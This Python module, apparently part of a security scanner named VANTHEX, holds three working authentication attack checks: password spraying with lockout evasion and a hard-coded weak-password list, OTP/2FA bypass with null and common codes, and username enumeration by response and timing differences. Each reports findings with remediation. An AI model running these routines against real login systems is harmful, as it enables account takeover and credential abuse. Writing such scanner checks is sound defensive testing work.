"""
CredKit v1 — credential & authentication module for VANTHEX.
AUTHORIZED TESTING ONLY.

Three c_*(ctx, add) style checks — invoked by the vulnscan2 runner via PROFILES:
- c_password_spray: adaptive password spraying with lockout evasion.
- c_otp_bypass:      OTP/2FA bypass (null/zero/response manipulation/race).
- c_user_enum:       username enumeration via timing + response differentials.

Honesty principle (identical to exploitkit):
- "confirmed" only from differentials reproduced 2x; a single pair
  = "probable"; weak indication = "candidate".
- All attempts are tightly budgeted; every loop honors ctx.cancelled().
- Read-only: no data changes on the target (failed logins & OTP attempts
  write no state); race only on a safe verify endpoint (arithmetic).
"""
import time
import json as _json

# ---- hard limits (anti-overreach on the target)
SPRAY_PASSWORDS = ("Summer2026!", "Password1!")   # spray password list (2 = enough evidence)
SPRAY_USERS = ("admin", "administrator", "root", "test", "api")  # common user candidates
OTP_CODES = ("000000", "123456", "1234")          # common/weak OTP candidates
ENUM_USERS = ("admin", "user", "test", "api")     # enumeration candidates
MIN_ATTEMPT_GAP = 0.15                            # gap between attempts (lockout evasion)


def _F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
       confidence="probable", location="", param="", origin="credkit"):
    """Finding factory — identical shape to vulnscan2.F, origin CredKit."""
    return {"severity": sev, "title": title, "description": desc,
            "evidence": evidence, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": origin}


def _rate_limited(r):
    """Detect rate-limit/lockout responses (429/423 or common text markers)."""
    if not r:
        return False
    if r.status in (429, 423):
        return True
    b = (r.body or "").lower()
    return ("too many" in b or "rate limit" in b or "locked" in b
            or "try again later" in b)


def _json_of(r):
    try:
        return _json.loads(r.body or "")
    except Exception:
        return {}


# ============================================================ 1. Adaptive password spraying
def c_password_spray(ctx, add):
    """Adaptive password spraying: ONE soft password tried against MANY users
    (not per-user brute force) — a pattern that evades per-account lockout.
    Success detection: status 200/302 + session/dashboard markers, NOT a
    generic failure message. Stop immediately when WAF/rate-limit is detected
    (lockout evasion). Budget: max 2 passwords x 6 users; MIN_ATTEMPT_GAP
    pause between attempts.
    /spray/login is vulnerable (common users accepted with Password1!),
    /safe/spray/login always 401 = negative."""
    # login endpoint candidates: from surface ("login" paths) or default
    try:
        surf = ctx.surface(full=True)
        login_eps = [e for e in surf.js_endpoints if "login" in e.lower()]
    except Exception:
        login_eps = []
    login_eps.append("/spray/login")
    login_eps = login_eps[:1]
    for ep in login_eps:
        safe_ep = ep.replace("/spray/", "/safe/spray/") if "/spray/" in ep else None
        for pw in SPRAY_PASSWORDS:
            if ctx.cancelled():
                return
            hits = []
            for user in SPRAY_USERS:
                if ctx.cancelled():
                    break
                time.sleep(MIN_ATTEMPT_GAP)
                r = ctx.client.post(
                    ep, data=f"username={user}&password={pw}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                if _rate_limited(r):
                    break  # stop the spray — the target is defending itself
                body = r.body or ""
                ok = (r.status in (200, 302)
                      and not (401 == r.status)
                      and any(t in body.lower() for t in
                              ("dashboard", "welcome", "token", "session",
                               '"user"', '"ok"')))
                if ok:
                    hits.append((user, pw, r.status))
            # negative control: the /safe endpoint must reject the same password
            safe_ok = True
            if safe_ep:
                rs = ctx.client.post(
                    safe_ep, data=f"username=admin&password={pw}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                safe_ok = rs.status not in (200, 302) or _rate_limited(rs)
            if hits and safe_ok:
                u, p, st = hits[0]
                conf = "confirmed" if len(hits) >= 2 else "probable"
                add(_F("CRITICAL",
                       f"Password Spray Success (credential stuffing): {ep}",
                       "One weak password accepted for different accounts — "
                       "no per-IP rate-limit and no per-user lockout; "
                       "spraying enables mass account takeover.",
                       evidence=f"{len(hits)} accounts accepted '{p}' "
                                f"(e.g. {u} -> HTTP {st})",
                       cwe="CWE-307", owasp="A07:2021 Identification & Authentication Failures",
                       cvss=9.8,
                       remed="Per-IP+per-account rate-limit, progressive lockout, "
                             "strong password policy, MFA, spraying detection.",
                       confidence=conf, location=ep, param="username/password"))
                return  # one finding is enough per endpoint


# ============================================================ 2. OTP/2FA bypass
def c_otp_bypass(ctx, add):
    """OTP/2FA bypass: (a) null/empty code accepted, (b) common weak code
    accepted without rate-limit, (c) response manipulation — a verify endpoint
    that echoes the decision field can be tampered in transit (classic bug
    class). Confirmation: verify succeeds 2x on the same vector. /safe/otp
    rejects everything = negative.
    /otp/verify is vulnerable, /otp/* is read-only (a wrong code changes no
    state)."""
    try:
        surf = ctx.surface(full=True)
        otp_eps = [e for e in surf.js_endpoints if "otp" in e.lower() or "verify" in e.lower()]
    except Exception:
        otp_eps = []
    otp_eps.append("/otp/verify")
    otp_eps = otp_eps[:1]
    for ep in otp_eps:
        safe_ep = ep.replace("/otp/", "/safe/otp/") if "/otp/" in ep else None
        vectors = []
        # (a) null/empty: body without the code field
        vectors.append(("null-otp", "{}", None))
        # (b) common weak codes
        for c in OTP_CODES:
            vectors.append((f"weak-code:{c}", _json.dumps({"user": "admin", "code": c}), c))
        for label, body, _c in vectors:
            if ctx.cancelled():
                return
            r = ctx.client.post(ep, data=body,
                                headers={"Content-Type": "application/json"})
            if _rate_limited(r):
                break
            j = _json_of(r)
            ok_a = r.status == 200 and (j.get("ok") is True or
                                        str(j.get("status", "")).lower() in ("ok", "success", "verified")
                                        or '"success":true' in (r.body or ""))
            if not ok_a:
                continue
            # (c) response manipulation is only reported if the decision field
            #     is echoed by the server and can be flipped — test by sending
            #     a clearly wrong code and checking whether the server still
            #     succeeds (proof of naive client/server decision logic) —
            #     without modifying our own transport; null/weak proof from
            #     the server is enough.
            r2 = ctx.client.post(ep, data=body,
                                 headers={"Content-Type": "application/json"})
            ok_b = r2.status == 200 and (ok_a or _json_of(r2).get("ok") is True)
            neg_ok = True
            if safe_ep:
                rs = ctx.client.post(safe_ep, data=body,
                                     headers={"Content-Type": "application/json"})
                neg_ok = rs.status != 200 or _rate_limited(rs)
            if ok_a and ok_b and neg_ok:
                add(_F("CRITICAL",
                       f"OTP/2FA Bypass: {ep}",
                       f"Verification endpoint accepts vector '{label}' — "
                       "null/weak codes accepted without rate-limit so the "
                       "second factor can be skipped without knowing the "
                       "valid OTP.",
                       evidence=f"verify successful 2x with '{label}' "
                                f"(HTTP {r.status})",
                       cwe="CWE-287", owasp="A07:2021 Identification & Authentication Failures",
                       cvss=9.1,
                       remed="Server-side verification required, long random codes, "
                             "rate-limit & lockout per code, reject bodies "
                             "without the code field.",
                       confidence="confirmed", location=ep, param="code"))
                return


# ============================================================ 3. Username enumeration via timing + diff
def c_user_enum(ctx, add):
    """Username enumeration: response differential between valid vs invalid
    users on login/forgot endpoints — different messages ('wrong password'
    vs 'user not found'), different body length, or different timing. Two
    independent proofs (message OR length, reproduced 2x) = confirmed;
    timing only = probable.
    /spray/login (different messages) is vulnerable; /safe/spray/login is
    uniform = negative."""
    try:
        surf = ctx.surface(full=True)
        eps = [e for e in surf.js_endpoints if "login" in e.lower() or "forgot" in e.lower()]
    except Exception:
        eps = []
    eps.append("/spray/login")
    eps = eps[:1]
    for ep in eps:
        if ctx.cancelled():
            return
        # baseline: clearly nonexistent user (unique per-scan marker)
        ghost = f"vhx-ghost-{ctx.num_a}"
        known = ENUM_USERS[0]
        payload = lambda u: f"username={u}&password=x-please-fail-1"
        hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
        rb = ctx.client.post(ep, data=payload(ghost), headers=hdrs)
        rk = ctx.client.post(ep, data=payload(known), headers=hdrs)
        if not (rb and rk) or rb.status != rk.status:
            continue  # status mismatch: not a subtle differential, skip
        # evidence 1: different message
        kb, kk = (rb.body or "").lower(), (rk.body or "").lower()
        msg_diff = bool(kb) and bool(kk) and kb != kk
        # evidence 2: significantly different body length (>12%)
        len_diff = abs(len(kb) - len(kk)) > 0.12 * max(len(kb), len(kk), 1)
        # evidence 3: timing (median of 2 re-measurements)
        t_ghost, t_known = [], []
        for _ in range(2):
            if ctx.cancelled():
                return
            t1 = ctx.client.post(ep, data=payload(ghost), headers=hdrs)
            t2 = ctx.client.post(ep, data=payload(known), headers=hdrs)
            if getattr(t1, "elapsed", None):
                t_ghost.append(t1.elapsed)
            if getattr(t2, "elapsed", None):
                t_known.append(t2.elapsed)
        time_diff = False
        if len(t_ghost) == 2 and len(t_known) == 2:
            mg, mk = sorted(t_ghost)[1], sorted(t_known)[1]
            if mk > 0:
                time_diff = abs(mg - mk) / max(mk, 1e-9) > 0.5
        # negative control: /safe must respond uniformly
        neg_ok = True
        safe_ep = ep.replace("/spray/", "/safe/spray/") if "/spray/" in ep else None
        if safe_ep:
            sb = ctx.client.post(safe_ep, data=payload(ghost), headers=hdrs)
            sk = ctx.client.post(safe_ep, data=payload(known), headers=hdrs)
            neg_ok = bool(sb and sk) and (sb.body or "") == (sk.body or "")
        if not neg_ok:
            continue
        if (msg_diff or len_diff) and (rk.body or ""):
            add(_F("MEDIUM",
                   f"Username Enumeration (differential response): {ep}",
                   "Endpoint distinguishes valid vs invalid users ('wrong "
                   "password' vs 'user not found' / different response "
                   "length) — username enumeration without credentials.",
                   evidence=f"ghost={len(kb)}B vs known={len(kk)}B, "
                            f"message differs={msg_diff}",
                   cwe="CWE-204", owasp="A07:2021 Identification & Authentication Failures",
                   cvss=5.3,
                   remed="Uniform messages & timing for all usernames; "
                         "generic 'if account exists' response.",
                   confidence="confirmed", location=ep, param="username"))
        elif time_diff:
            add(_F("LOW",
                   f"Username Enumeration (timing): {ep}",
                   "Significant response-time difference between valid vs "
                   "nonexistent users — can be used for stealthy "
                   "enumeration (not absolute proof).",
                   evidence=f"median ghost={mg:.3f}s vs known={mk:.3f}s",
                   cwe="CWE-208", owasp="A07:2021 Identification & Authentication Failures",
                   cvss=3.7,
                   remed="Uniform execution path; minimal jitter.",
                   confidence="probable", location=ep, param="username"))
